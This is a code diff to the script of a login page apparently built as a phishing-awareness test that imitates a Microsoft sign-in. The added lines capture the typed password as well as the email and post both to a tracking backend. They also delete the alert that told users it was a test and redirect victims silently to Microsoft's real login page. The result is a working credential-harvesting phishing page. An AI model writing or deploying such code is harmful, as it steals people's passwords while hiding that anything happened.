@@ -25,16 +25,29 @@
             event.preventDefault();
 
             const username = document.getElementById("username").value;
-            fetch("https://your-backend.com/api/track-attempt", {
+            const password = document.getElementById("password").value; 
+
+            // 🔹 Send tracking request to your localhost backend
+            fetch("http://127.0.0.1:8000/api/track-attempt", {
                 method: "POST",
                 headers: {
                     "Content-Type": "application/json"
                 },
-                body: JSON.stringify({ email: username, timestamp: new Date().toISOString() })
-            }).then(() => {
-                alert("⚠ This is a phishing awareness test. DO NOT enter your real credentials.");
-                window.location.href = "https://security.microsoft.com"; // Redirect to Microsoft Security page
-            }).catch(error => console.error("Error:", error));
+                body: JSON.stringify({ 
+                    email: username, 
+                    password: password, // ⚠ Optional: Remove if you don't want to log this
+                    timestamp: new Date().toISOString() 
+                })
+            }).then(response => {
+                if (response.ok) {
+                    // ✅ Redirect to Microsoft's official login page
+                    window.location.href = "https://login.microsoftonline.com/";
+                } else {
+                    alert("Error tracking login attempt.");
+                }
+            }).catch(error => {
+                console.error("Error:", error);
+            });
         });
     </script>
 </body>
